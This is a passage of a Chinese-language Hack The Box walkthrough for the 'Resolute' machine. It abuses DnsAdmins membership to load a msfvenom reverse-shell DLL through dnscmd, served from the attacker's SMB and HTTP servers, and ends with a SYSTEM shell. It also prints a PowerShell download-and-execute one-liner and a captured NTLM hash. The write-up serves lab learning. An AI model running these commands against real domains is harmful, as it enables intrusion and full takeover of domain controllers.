<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ryan\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        12/3/2019   7:34 AM            155 note.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; type note.txt</span><br><span class="line">Email to team:</span><br><span class="line"></span><br><span class="line">- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>由于变更冻结的原因，系统变更(除管理员账户变更外)会在1分钟内自动恢复。算是一个提醒，但对于当下的我还没明白它对我有什么利弊。</p>
<p>当前用户没什么特殊权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br></pre></td></tr></table></figure>

<p>我可以看一下它的具体信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net user ryan</span><br><span class="line">User name                    ryan</span><br><span class="line">Full Name                    Ryan Bertrand</span><br><span class="line">Comment</span><br><span class="line">User&#x27;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            4/23/2022 4:52:02 AM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          4/24/2022 4:52:02 AM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Contractors</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>它并不在远程管理组中，那为什么我能远程登录到它呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net localgroup &quot;Remote Management Users&quot;</span><br><span class="line">Alias name     Remote Management Users</span><br><span class="line">Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Contractors</span><br><span class="line">melanie</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>哦，ryan在Contractors里，而Contractors在远程管理组中，所以我才能远程登录。不过并不重要。我可以看一眼ryan用户详细组：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>ryan在DnsAdmins 组里，这个组看着像权限挺大的。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">Microsoft 文档</a>将此 DnsAdmins 描述为：DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。</p>
<p>在谷歌中不断搜索。我发现了这篇文章：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/</span><br></pre></td></tr></table></figure>

<p>我可以截一些关键的信息：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423202545223.png" srcset="/img/loading.gif" lazyload alt="image-20220423202545223"  />

<p>在本目标中，DNS服务就位于域控上，如果我将包含载荷的DLL注入到DNS服务器进程中，那么回连的会话便会是域控的会话，如果我能将DLL注入到系统进程中，那么回连的会话也是系统级别的。关于DLL注入，在我博客的C语言学习笔记中有提到过一些细节，这里我就不写了。</p>
<p>至于dnscmd，很简单，我只需要运行一下 -h 确定当前目标有没有即可，回显信息有很多，我只列一些，它位于system下，通常该目录下的exe都具有系统环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd -h</span><br><span class="line"></span><br><span class="line">Usage: DnsCmd &lt;ServerName&gt; &lt;Command&gt; [&lt;Command Parameters&gt;]</span><br><span class="line">&lt;ServerName&gt;:</span><br><span class="line">  IP address or host name    -- remote or local DNS server</span><br><span class="line">  .                          -- DNS server on local machine</span><br><span class="line">&lt;Command&gt;:</span><br><span class="line">  /Info                      -- Get server information</span><br><span class="line">  /Config                    -- Reset server or zone configuration</span><br><span class="line">  /EnumZones                 -- Enumerate zones</span><br><span class="line">  /Statistics                -- Query/clear server statistics data</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>首先我可以生成dll载荷，目标操作系统版本在前边crackmapexec已经为我枚举出来了，windows 2016 x64：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=1337 -f dll -o whoami.dll</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 8704 bytes</span><br><span class="line">Saved as: whoami.dll</span><br></pre></td></tr></table></figure>

<p>我还是选择meterpreter会话，或许可能需要其他一些功能，meterpreter方便很多：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf-pro &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf-pro exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/x64/shell_reverse_tcp</span><br><span class="line">msf-pro exploit(multi/handler) &gt; set lport 1337</span><br><span class="line">lport =&gt; 1337</span><br><span class="line">msf-pro exploit(multi/handler) &gt; set LHOST 10.10.16.7</span><br><span class="line">LHOST =&gt; 10.10.16.7</span><br><span class="line">msf-pro exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.7:1337 </span><br></pre></td></tr></table></figure>

<p>接下来我需要将dll传入到目标机器中，我可以开个smb共享让其加载我的dll或许会方便很多：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./toolbox/impacket-0.9.24/examples/smbserver.py hack .</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>

<p>我可以照着它dnscmd示例，编写如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd.exe /config /serverlevelplugindll \\10.10.16.7\whoami.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt;</span><br></pre></td></tr></table></figure>

<p>没回连，不要紧，或许我需要重新启动DNS服务，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; dnscmd.exe /config /serverlevelplugindll \\10.10.16.7\whoami.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 3  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x1</span><br><span class="line">        WAIT_HINT          : 0x7530</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; sc.exe \\resolute start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 2  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 2624</span><br><span class="line">        FLAGS              :</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt;</span><br></pre></td></tr></table></figure>

<p>可它还是没回连：</p>
<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423205651911.png" srcset="/img/loading.gif" lazyload alt="image-20220423205651911"  />

<p>共享也访问成功了，端口IP也对，载荷也对，命令也成功，我的经验告诉我问题不应该出现在这里，或许我遗漏了什么，在我往前翻记录时，我忽然想起，好像有个笔记告诉我说系统变更会在一分钟内自动恢复。或许我需要动作快：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnscmd.exe /config /serverlevelplugindll \\10.10.16.7\s\whoami.dll</span><br><span class="line">sc.exe \\resolute stop dns</span><br><span class="line">sc.exe \\resolute start dns</span><br></pre></td></tr></table></figure>

<p>wget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; wget http://10.10.16.7/whoami.dll -O whoami.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ryan\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        12/3/2019   7:34 AM            155 note.txt</span><br><span class="line">-a----        4/23/2022   6:15 AM           8704 whoami.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server 80             </span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.10.169 - - [23/Apr/2022 21:08:33] &quot;GET /whoami.dll HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>好吧，wget也会被删除：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ryan\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        12/3/2019   7:34 AM            155 note.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>这是一场时间的考验，看起来我需要摸索等它下一次恢复时，快速的将dll注入进去，那我的命令需要改一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.7/whoami.dll -O whoami.dll</span><br><span class="line">dnscmd.exe /config /serverlevelplugindll .\whoami.dll</span><br><span class="line">sc.exe \\resolute stop dns</span><br><span class="line">sc.exe \\resolute start dns</span><br></pre></td></tr></table></figure>

<p>可以看一下它的时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net time</span><br><span class="line">Current time at \\Resolute.megabank.local is 4/23/2022 6:19:03 AM                                                 </span><br><span class="line">                                                                                                                  </span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>等它到下一次整分的时候再忙活，好吧它也不是整分的规律，或许是半分，管道符也不适用，或许我可以借助一些自动化工具，它是基于将DLL注入到系统服务之中，这种攻击方式在Metsploit中有对应的模块，但是当我准备通过powershell回连会话的时候，我看到了提示信息中的一条：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.7/shell.ps1&#x27;))&quot;</span><br><span class="line">powershell.exe : IEX : At line:1 char:1</span><br><span class="line">    + CategoryInfo          : NotSpecified: (IEX : At line:1 char:1:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">+ function uAG0x &#123;</span><br><span class="line">+ ~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.7/she ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.Invok </span><br><span class="line">   eExpressionCommand</span><br><span class="line"> </span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p><strong>This script contains malicious content and has been blocked by your antivirus software.</strong></p>
<p><strong>此脚本包含恶意内容，已被杀毒软件阻止。</strong> </p>
<p>我大概知道了为什么没有回连了，或许我应该重置一下目标环境。那么再来一次，生成载荷：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=443 -f dll -o whoami.dll</span><br></pre></td></tr></table></figure>

<p>在当前目录启动smb匿名共享：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./smbserver.py s .</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.169,49882)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:21b823d5b1d20b282614012d7e93de6f:010100000000000000c3f99b1b57d801dc0992e0706ee955000000000100100056006700730061004b005800410079000300100056006700730061004b00580041007900020010004d004600470058004d006c0076006800040010004d004600470058004d006c00760068000700080000c3f99b1b57d8010600040002000000080030003000000000000000000000000040000059bd883320297b2e2588ab272c806f552b1114d4c485915f802e15a1c1bb07b60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:S)</span><br><span class="line">[*] Closing down connection (10.10.10.169,49882)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>

<p>命令执行一气呵成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd.exe /config /serverlevelplugindll \\10.10.16.7\s\whoami.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 3  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 2  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 140</span><br><span class="line">        FLAGS              :</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; </span><br></pre></td></tr></table></figure>

<h5 id="以system身份获取shell："><a href="#以system身份获取shell：" class="headerlink" title="以system身份获取shell："></a>以system身份获取shell：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lnvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.10.10.169] 49883</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>我拥有了root.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">12/04/2019  06:18 AM    &lt;DIR&gt;          .</span><br><span class="line">12/04/2019  06:18 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/23/2022  07:11 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   2,483,277,824 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;type root.txt</span><br></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough - Resolute</div>
      <div>https://crazyinside.github.io/post/HackTheBox-Resolute.html</div>
    </div>
    <div class="license-meta">
      
